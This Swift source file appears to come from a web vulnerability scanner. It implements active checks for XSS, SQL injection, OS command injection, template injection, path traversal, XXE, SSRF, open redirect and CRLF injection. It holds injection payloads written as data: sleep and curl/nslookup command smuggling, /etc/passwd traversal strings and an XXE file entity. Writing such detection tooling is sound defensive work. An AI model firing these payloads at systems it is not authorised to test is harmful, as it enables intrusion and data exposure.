// GulpScanner — the [P0] active checks (F08 §3.2, M11b) with the precision rules of §3.4: reflected
// XSS by context with unencoded-breakout confirmation, stored XSS with a unique canary, SQL injection
// (error, boolean with two independent true/false pairs, time with dose-response), OS command
// injection (time and OAST), SSTI with random operands, path traversal confirmed by file markers,
// XXE (in-band and OAST), SSRF (OAST), open redirect confirmed by a real redirect to a canary host,
// and CRLF injection confirmed by a parsed response header. Payloads are benign: markers,
// arithmetic, sleeps and lookups; nothing writes or deletes data except stored XSS's marker, which
// only runs on requests that already submit data.

import Foundation
import GulpCore

/// The built-in checks.
public enum ActiveChecks {
    /// Every built-in active check.
    public static let all: [any ActiveCheck] =
        [
            ReflectedXSSCheck(), StoredXSSCheck(), SQLInjectionCheck(), CommandInjectionCheck(),
            TemplateInjectionCheck(),
            PathTraversalCheck(), XXECheck(), SSRFCheck(), OpenRedirectCheck(), CRLFCheck(),
        ] + ExtendedChecks.all

    /// Family names (for configs).
    public static var families: [String] { Array(Set(all.map(\.family))).sorted() }

    static let parameterKinds: Set<InsertionPointKind> = [
        .urlParam, .bodyParam, .jsonValue, .xmlValue, .multipartField, .cookie, .pathSegment, .custom,
    ]
}

/// Strip occurrences of `values` from `text` (so reflections don't count as differences).
func stripping(_ text: String, _ values: [String]) -> String {
    var out = text
    for value in values where !value.isEmpty { out = out.replacingOccurrences(of: value, with: "") }
    return out
}

// MARK: - XSS

/// Reflected XSS by context (§3.4).
struct ReflectedXSSCheck: ActiveCheck {
    let id = "active.xss.reflected"
    let family = "xss"
    let intensity = CheckIntensity.light
    let kinds: Set<InsertionPointKind> = ActiveChecks.parameterKinds.union([.header])

    enum Context: String { case html, attribute, script, url }

    func run(_ point: InsertionPoint?, baseline: Baseline?, context: AuditContext) async -> [IssueFinding] {
        guard let point, let baseline else { return [] }
        let type = baseline.canary.header("content-type")?.lowercased() ?? ""
        guard type.contains("html"), baseline.canary.body.contains(baseline.canaryValue) else { return [] }
        var findings: [IssueFinding] = []
        for (reflection, quote) in Self.contexts(of: baseline.canaryValue, in: baseline.canary.body) {
            let token = self.token(reflection, quote: quote)
            let probe = await context.send(point.build(context.base, payload: token.payload))
            guard probe.body.contains(token.proof) else { continue }
            findings.append(
                context.finding(
                    id, point: point, variant: reflection.rawValue,
                    detail:
                        "The value of **\(point.label)** is reflected into the page's \(reflection.rawValue) context and the breakout `\(token.proof)` came back unencoded"
                        + (quote.map { " (the \($0) quote survived)" } ?? "")
                        + ", so script can be injected.",
                    evidence: probe, marker: token.proof, confidence: .firm))
        }
        return findings
    }

    func token(_ context: Context, quote: Character?) -> (payload: String, proof: String) {
        let a = "g" + String(Int.random(in: 100_000...999_999))
        switch context {
        case .html: return ("\(a)<gx\(a)>", "\(a)<gx\(a)>")
        case .attribute:
            let q = quote.map(String.init) ?? "\""
            return ("\(a)\(q) gx\(a)=1 \(q)", "\(a)\(q) gx\(a)=1")
        case .script:
            let q = quote.map(String.init) ?? "'"
            return ("\(a)\(q);gx\(a)//", "\(a)\(q);gx\(a)")
        case .url: return ("javascript:\(a)//", "\"javascript:\(a)//")
        }
    }

    /// The contexts the canary is reflected in, with the enclosing quote for attribute/script.
    static func contexts(of canary: String, in body: String) -> [(Context, Character?)] {
        var result: [(Context, Character?)] = []
        var searchStart = body.startIndex
        while let range = body.range(of: canary, range: searchStart..<body.endIndex) {
            searchStart = range.upperBound
            let before = body[body.startIndex..<range.lowerBound]
            let lastOpen = before.range(of: "<", options: .backwards)
            let lastClose = before.range(of: ">", options: .backwards)
            let scriptOpen = before.range(of: "<script", options: [.backwards, .caseInsensitive])
            let scriptClose = before.range(of: "</script", options: [.backwards, .caseInsensitive])
            if let scriptOpen, scriptClose.map({ $0.lowerBound < scriptOpen.lowerBound }) ?? true,
                let tagEnd = body[scriptOpen.upperBound...].firstIndex(of: ">"), tagEnd < range.lowerBound
            {
                // Inside a script block: find the open string quote on this line.
                let line = before[
                    (before.lastIndex(of: "\n").map { before.index(after: $0) } ?? before.startIndex)...]
                var open: Character?
                var escaped = false
                for char in line {
                    if escaped {
                        escaped = false
                        continue
                    }
                    if char == "\\" {
                        escaped = true
                    } else if let current = open {
                        if char == current { open = nil }
                    } else if char == "'" || char == "\"" || char == "`" {
                        open = char
                    }
                }
                result.append((.script, open ?? "'"))
            } else if let lastOpen, lastClose.map({ $0.lowerBound < lastOpen.lowerBound }) ?? true {
                // Inside a tag: an attribute value.
                let tag = before[lastOpen.upperBound...]
                let quote: Character? = tag.last == "\"" || tag.last == "'" ? tag.last : nil
                let attribute = tag.dropLast(quote == nil ? 0 : 1).trimmingCharacters(in: .whitespaces)
                let name =
                    attribute.split(whereSeparator: { $0 == " " || $0 == "=" }).last.map { $0.lowercased() }
                    ?? ""
                if ["href", "src", "action", "formaction"].contains(name),
                    tag.hasSuffix("=\(quote.map(String.init) ?? "")")
                {
                    result.append((.url, quote))
                } else {
                    result.append((.attribute, quote))
                }
            } else {
                result.append((.html, nil))
            }
        }
        // One probe per distinct context.
        var seen: Set<String> = []
        return result.filter { seen.insert($0.0.rawValue + String($0.1 ?? " ")).inserted }
    }
}

/// Stored XSS: a unique canary submitted with the request, then found unencoded on the page.
struct StoredXSSCheck: ActiveCheck {
    let id = "active.xss.stored"
    let family = "xss"
    let intensity = CheckIntensity.balanced
    let kinds: Set<InsertionPointKind> = [.bodyParam, .jsonValue, .multipartField]

    func run(_ point: InsertionPoint?, baseline: Baseline?, context: AuditContext) async -> [IssueFinding] {
        guard let point else { return [] }
        let method = context.base.bytes[context.base.parsed.method].string().uppercased()
        guard method == "POST" || method == "PUT" else { return [] }
        let a = "g" + String(Int.random(in: 100_000...999_999))
        let payload = "\(a)<gx\(a)>"
        _ = await context.send(point.build(context.base, payload: payload))
        // The page at the same path, fetched with GET.
        let target = context.base.bytes[context.base.parsed.target].string()
        var lines = ["GET \(target) HTTP/1.1"]
        for field in context.base.parsed.headers {
            let name = context.base.bytes[field.name].string().lowercased()
            if ["host", "cookie", "user-agent", "authorization"].contains(name) {
                lines.append(
                    context.base.bytes[field.name].string() + ": " + context.base.bytes[field.value].string())
            }
        }
        let render = await context.send(RawRequest(Bytes(lines.joined(separator: "\r\n") + "\r\n\r\n")))
        guard render.body.contains(payload) else { return [] }
        return [
            context.finding(
                id, point: point,
                detail:
                    "A unique marker submitted in **\(point.label)** was stored and later rendered unencoded (`\(payload)`) when the page was fetched again.",
                evidence: render, marker: payload)
        ]
    }
}

// MARK: - SQL injection

/// SQL injection: error, boolean and time based (§3.4).
struct SQLInjectionCheck: ActiveCheck {
    let id = "active.sqli"
    let family = "sqli"
    let intensity = CheckIntensity.light
    let kinds: Set<InsertionPointKind> = ActiveChecks.parameterKinds

    static let errorPatterns = [
        "SQLite error", "sqlite3.OperationalError", "unrecognized token",
        "You have an error in your SQL syntax",
        "syntax error at or near", "unterminated quoted string", "Unclosed quotation mark", "SQLSTATE[",
        "ORA-01756",
        "quoted string not properly terminated", "SQL syntax", "near \"",
    ]

    func run(_ point: InsertionPoint?, baseline: Baseline?, context: AuditContext) async -> [IssueFinding] {
        guard let point, let baseline else { return [] }
        var findings: [IssueFinding] = []
        let v = point.baseValue
        // Error based.
        for payload in ["\(v)'", "\(v)\""] {
            let probe = await context.send(point.build(context.base, payload: payload))
            if let error = Self.errorPatterns.first(where: {
                probe.text.contains($0) && !baseline.original.text.contains($0)
            }) {
                findings.append(
                    context.finding(
                        "active.sqli.error", point: point,
                        detail:
                            "Adding a quote to **\(point.label)** made the application return a database error (`\(error)`).",
                        evidence: probe, marker: error))
                break
            }
        }
        // Boolean based: two independent true/false pairs, in a numeric and then a string context (a
        // numeric-looking value is often quoted in the query).
        if !baseline.volatile {
            var families: [[(String, String)]] = [
                [("\(v)' AND '1'='1", "\(v)' AND '1'='2"), ("\(v)' AND 'x'='x", "\(v)' AND 'x'='y")]
            ]
            if Int(v) != nil {
                families.insert([("\(v) AND 1=1", "\(v) AND 1=2"), ("\(v) AND 7=7", "\(v) AND 7=8")], at: 0)
            }
            for pairs in families {
                var confirmed = true
                var evidence: Probe?
                for (truePayload, falsePayload) in pairs {
                    let yes = await context.send(point.build(context.base, payload: truePayload))
                    let no = await context.send(point.build(context.base, payload: falsePayload))
                    let same = Self.similar(yes, baseline.original, removing: [truePayload, v])
                    let different = !Self.similar(no, baseline.original, removing: [falsePayload, v])
                    if !(same && different) {
                        confirmed = false
                        break
                    }
                    evidence = no
                }
                if confirmed, let evidence {
                    findings.append(
                        context.finding(
                            "active.sqli.boolean", point: point,
                            detail:
                                "Two independent pairs of true/false conditions appended to **\(point.label)** changed the response consistently: the true conditions matched the original page, the false ones did not.",
                            evidence: evidence))
                    break
                }
            }
        }
        // Time based (dose-response).
        // Numeric contexts first when the value looks numeric, then quoted ones; a template that
        // doesn't delay costs one probe.
        var templates = [
            "\(v)' AND SLEEP(%d)-- -", "\(v)'||pg_sleep(%d)--", "\(v)'; WAITFOR DELAY '0:0:%d'--",
        ]
        if Int(v) != nil {
            templates.insert(contentsOf: ["\(v) AND SLEEP(%d)", "\(v);SELECT pg_sleep(%d)--"], at: 0)
        }
        if let proof = await DoseResponse.confirm(
            templates: templates, point: point, baseline: baseline, context: context)
        {
            findings.append(
                context.finding(
                    "active.sqli.time", point: point,
                    detail:
                        "Sleep payloads in **\(point.label)** delayed the response in proportion to the requested delay (\(proof.summary)).",
                    evidence: proof.probe))
        }
        return findings
    }

    /// Responses match: same status and the same body once reflected input is removed.
    static func similar(_ a: Probe, _ b: Probe, removing: [String]) -> Bool {
        guard a.status == b.status else { return false }
        let x = stripping(
            a.body,
            removing + removing.map { $0.addingPercentEncoding(withAllowedCharacters: .alphanumerics) ?? $0 })
        let y = stripping(b.body, removing)
        if x == y { return true }
        // Tolerate tiny differences (≤ 2 %) that the payload's own reflection can cause.
        let difference = abs(x.count - y.count)
        return difference <= max(4, y.count / 50) && x.prefix(64) == y.prefix(64)
    }
}

/// Dose-response timing (SCN-032, §3.4): the delay must scale with the injected value.
enum DoseResponse {
    struct Proof {
        var probe: Probe
        var summary: String
    }

    static func confirm(templates: [String], point: InsertionPoint, baseline: Baseline, context: AuditContext)
        async -> Proof?
    {
        let base = baseline.original.seconds
        for template in templates {
            let two = await context.time(point.build(context.base, payload: String(format: template, 2)))
            guard two.seconds - base >= 1.6 else { continue }
            let one = await context.time(point.build(context.base, payload: String(format: template, 1)))
            let four = await context.time(point.build(context.base, payload: String(format: template, 4)))
            let d1 = one.seconds - base
            let d2 = two.seconds - base
            let d4 = four.seconds - base
            // Each delay within 40 % of the requested one, and increasing with it.
            if abs(d1 - 1) <= 0.6, abs(d2 - 2) <= 0.8, abs(d4 - 4) <= 1.6, d1 < d2, d2 < d4 {
                return Proof(
                    probe: four.probe,
                    summary: String(
                        format: "1 s → %.1f s, 2 s → %.1f s, 4 s → %.1f s over a %.2f s baseline", d1, d2, d4,
                        base))
            }
        }
        return nil
    }
}

// MARK: - OS command injection

/// OS command injection: time-based and OAST-based.
struct CommandInjectionCheck: ActiveCheck {
    let id = "active.cmd"
    let family = "cmd"
    let intensity = CheckIntensity.light
    let kinds: Set<InsertionPointKind> = ActiveChecks.parameterKinds

    func run(_ point: InsertionPoint?, baseline: Baseline?, context: AuditContext) async -> [IssueFinding] {
        guard let point, let baseline else { return [] }
        var findings: [IssueFinding] = []
        let v = point.baseValue
        let templates = [
            "\(v);sleep %d;", "\(v)|sleep %d", "\(v)$(sleep %d)", "\(v)`sleep %d`", "\(v)&&sleep %d",
        ]
        if let proof = await DoseResponse.confirm(
            templates: templates, point: point, baseline: baseline, context: context)
        {
            findings.append(
                context.finding(
                    "active.cmd.time", point: point,
                    detail:
                        "Shell `sleep` commands appended to **\(point.label)** delayed the response accordingly (\(proof.summary)).",
                    evidence: proof.probe))
        }
        if let oast = context.oast {
            for template in ["\(v);nslookup %@;", "\(v)$(nslookup %@)", "\(v)|curl http://%@/"] {
                guard let host = await oast.mint(note: "cmd \(point.label)") else { break }
                let probe = await context.send(
                    point.build(context.base, payload: String(format: template, host)))
                await context.expectOAST(
                    host,
                    context.finding(
                        "active.cmd.oast", point: point,
                        detail:
                            "A shell command appended to **\(point.label)** made the server look up or fetch a Beacon host.",
                        evidence: probe, requestMarker: host, confidence: .certain))
            }
        }
        return findings
    }
}

// MARK: - SSTI

/// Server-side template injection with randomized arithmetic (§3.4).
struct TemplateInjectionCheck: ActiveCheck {
    let id = "active.ssti"
    let family = "ssti"
    let intensity = CheckIntensity.light
    let kinds: Set<InsertionPointKind> = ActiveChecks.parameterKinds

    func run(_ point: InsertionPoint?, baseline: Baseline?, context: AuditContext) async -> [IssueFinding] {
        guard let point, let baseline else { return [] }
        for template in ["{{%d*%d}}", "${%d*%d}", "<%%= %d*%d %%>", "#{%d*%d}", "{{=%d*%d}}"] {
            let a = Int.random(in: 1_000...9_999)
            let b = Int.random(in: 1_000...9_999)
            let product = String(a * b)
            let payload = String(format: template, a, b)
            let probe = await context.send(point.build(context.base, payload: point.baseValue + payload))
            if probe.body.contains(product), !baseline.original.body.contains(product) {
                return [
                    context.finding(
                        id, point: point, variant: template,
                        detail:
                            "The template expression `\(payload)` in **\(point.label)** was evaluated: the response contains its product `\(product)`.",
                        evidence: probe, marker: product, confidence: .certain)
                ]
            }
        }
        return []
    }
}

// MARK: - Path traversal

/// Path traversal confirmed by known file contents.
struct PathTraversalCheck: ActiveCheck {
    let id = "active.path-traversal"
    let family = "path-traversal"
    let intensity = CheckIntensity.light
    let kinds: Set<InsertionPointKind> = ActiveChecks.parameterKinds

    static let probes: [(payload: String, encoded: Bool, marker: String)] = [
        ("../../../../../../../../etc/passwd", false, "root:x:0:0:"),
        ("..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", true, "root:x:0:0:"),
        ("....//....//....//....//....//etc/passwd", false, "root:x:0:0:"),
        ("/etc/passwd", false, "root:x:0:0:"),
        ("..\\..\\..\\..\\..\\..\\windows\\win.ini", false, "[fonts]"),
    ]

    func run(_ point: InsertionPoint?, baseline: Baseline?, context: AuditContext) async -> [IssueFinding] {
        guard let point, let baseline else { return [] }
        for probeSpec in Self.probes where !baseline.original.text.contains(probeSpec.marker) {
            let probe = await context.send(
                point.build(context.base, payload: probeSpec.payload, encoded: probeSpec.encoded))
            if probe.body.contains(probeSpec.marker) {
                return [
                    context.finding(
                        id, point: point,
                        detail:
                            "Requesting `\(probeSpec.payload)` through **\(point.label)** returned the contents of a system file (`\(probeSpec.marker)`).",
                        evidence: probe, marker: probeSpec.marker, confidence: .certain)
                ]
            }
        }
        return []
    }
}

// MARK: - XXE

/// XML external entities: in-band file read and OAST.
struct XXECheck: ActiveCheck {
    let id = "active.xxe"
    let family = "xxe"
    let intensity = CheckIntensity.light
    let kinds: Set<InsertionPointKind> = [.wholeBody]

    func run(_ point: InsertionPoint?, baseline: Baseline?, context: AuditContext) async -> [IssueFinding] {
        guard let point, let baseline else { return [] }
        var findings: [IssueFinding] = []
        let body = point.baseValue
        var xml = body
        var declaration = ""
        if xml.hasPrefix("<?xml"), let end = xml.range(of: "?>") {
            declaration = String(xml[..<end.upperBound])
            xml = String(xml[end.upperBound...])
        }
        // In-band: an entity for /etc/passwd used as the first text value.
        if let text = try? NSRegularExpression(pattern: #">([^<>]+)</"#),
            let match = text.firstMatch(in: xml, range: NSRange(xml.startIndex..., in: xml)),
            let range = Range(match.range(at: 1), in: xml), !baseline.original.text.contains("root:x:0:0:")
        {
            let root = xml.replacingCharacters(in: range, with: "&gx;")
            let payload = declaration + #"<!DOCTYPE r [<!ENTITY gx SYSTEM "file:///etc/passwd">]>"# + root
            let probe = await context.send(point.build(context.base, payload: payload))
            if probe.body.contains("root:x:0:0:") {
                findings.append(
                    context.finding(
                        "active.xxe.inband", point: point,
                        detail:
                            "An external entity pointing at `file:///etc/passwd` was expanded into the response.",
                        evidence: probe, marker: "root:x:0:0:", confidence: .certain))
            }
        }
        if let oast = context.oast, let host = await oast.mint(note: "xxe") {
            let payload = declaration + "<!DOCTYPE r [<!ENTITY % gx SYSTEM \"http://\(host)/x\"> %gx;]>" + xml
            let probe = await context.send(point.build(context.base, payload: payload))
            await context.expectOAST(
                host,
                context.finding(
                    "active.xxe.oast", point: point,
                    detail: "A parameter entity in the request body made the XML parser fetch a Beacon URL.",
                    evidence: probe,
                    requestMarker: host, confidence: .certain))
        }
        return findings
    }
}

// MARK: - SSRF

/// Server-side request forgery via OAST.
struct SSRFCheck: ActiveCheck {
    let id = "active.ssrf"
    let family = "ssrf"
    let intensity = CheckIntensity.light
    let kinds: Set<InsertionPointKind> = ActiveChecks.parameterKinds.union([.header])

    static let names = try? NSRegularExpression(
        pattern:
            "url|uri|link|src|dest|redirect|next|target|fetch|image|img|feed|callback|webhook|proxy|load|domain|site",
        options: [.caseInsensitive])

    func run(_ point: InsertionPoint?, baseline: Baseline?, context: AuditContext) async -> [IssueFinding] {
        guard let point, let oast = context.oast else { return [] }
        let value = point.baseValue.lowercased()
        let urlish = value.hasPrefix("http://") || value.hasPrefix("https://") || value.hasPrefix("//")
        let named =
            Self.names?.firstMatch(in: point.name, range: NSRange(point.name.startIndex..., in: point.name))
            != nil
        guard urlish || named, point.kind != .header || point.name.lowercased() == "referer" else {
            return []
        }
        guard let host = await oast.mint(note: "ssrf \(point.label)") else { return [] }
        let probe = await context.send(point.build(context.base, payload: "http://\(host)/"))
        await context.expectOAST(
            host,
            context.finding(
                "active.ssrf.oast", point: point,
                detail: "A URL placed in **\(point.label)** was fetched (or resolved) by the server.",
                evidence: probe,
                requestMarker: host, confidence: .certain))
        return []
    }
}

// MARK: - Open redirect

/// Open redirect confirmed by a redirect to a canary host (§3.4).
struct OpenRedirectCheck: ActiveCheck {
    let id = "active.open-redirect"
    let family = "redirect"
    let intensity = CheckIntensity.light
    let kinds: Set<InsertionPointKind> = [.urlParam, .bodyParam, .jsonValue, .custom]

    func run(_ point: InsertionPoint?, baseline: Baseline?, context: AuditContext) async -> [IssueFinding] {
        guard let point else { return [] }
        let canary = "\(context.token(8)).gulp-canary.test"
        for payload in ["https://\(canary)/", "//\(canary)/", "/\\\(canary)/", "https:\(canary)"] {
            let probe = await context.send(point.build(context.base, payload: payload))
            if let status = probe.status, (300..<400).contains(status),
                let location = probe.header("location"),
                Self.host(of: location) == canary
            {
                return [
                    context.finding(
                        id, point: point,
                        detail:
                            "**\(point.label)** set to `\(payload)` redirected the browser to that host (`Location: \(location)`).",
                        evidence: probe, marker: canary, confidence: .certain)
                ]
            }
            let body = probe.body.lowercased()
            if body.contains("http-equiv=\"refresh\"") || body.contains("location"),
                body.contains("url=\(payload.lowercased())")
                    || body.contains("location='\(payload.lowercased())")
                    || body.contains("location.href='\(payload.lowercased())")
            {
                return [
                    context.finding(
                        id, point: point, variant: "client-side",
                        detail:
                            "**\(point.label)** set to `\(payload)` produced a client-side redirect to that host.",
                        evidence: probe, marker: canary, confidence: .firm)
                ]
            }
        }
        return []
    }

    /// The host a browser would go to for `location`.
    static func host(of location: String) -> String? {
        var rest = location.trimmingCharacters(in: .whitespaces).replacingOccurrences(of: "\\", with: "/")
        if let scheme = rest.range(of: "://") {
            rest = String(rest[scheme.upperBound...])
        } else if rest.hasPrefix("//") {
            rest = String(rest.dropFirst(2))
        } else if rest.lowercased().hasPrefix("https:") || rest.lowercased().hasPrefix("http:") {
            rest = String(rest.drop(while: { $0 != ":" }).dropFirst())
        } else {
            return nil
        }
        return rest.split(whereSeparator: { "/?#:".contains($0) }).first.map { $0.lowercased() }
    }
}

// MARK: - CRLF

/// CRLF / header injection confirmed by a parsed response header (§3.4).
struct CRLFCheck: ActiveCheck {
    let id = "active.crlf"
    let family = "crlf"
    let intensity = CheckIntensity.light
    let kinds: Set<InsertionPointKind> = [.urlParam, .bodyParam, .pathSegment, .cookie, .custom]

    func run(_ point: InsertionPoint?, baseline: Baseline?, context: AuditContext) async -> [IssueFinding] {
        guard let point else { return [] }
        let token = context.token(8)
        let value = InsertionPoint.encode(point.baseValue, .url)
        for separator in ["%0d%0a", "%0a", "%0d", "%E5%98%8A%E5%98%8D"] {
            let payload = "\(value)\(separator)X-Gulp-Inject:%20\(token)"
            let probe = await context.send(point.build(context.base, payload: payload, encoded: true))
            if probe.header("x-gulp-inject") == token {
                return [
                    context.finding(
                        id, point: point,
                        detail:
                            "Line breaks (`\(separator)`) in **\(point.label)** started a new response header: the response carries `X-Gulp-Inject: \(token)`.",
                        evidence: probe, marker: "X-Gulp-Inject: \(token)", confidence: .certain)
                ]
            }
        }
        return []
    }
}
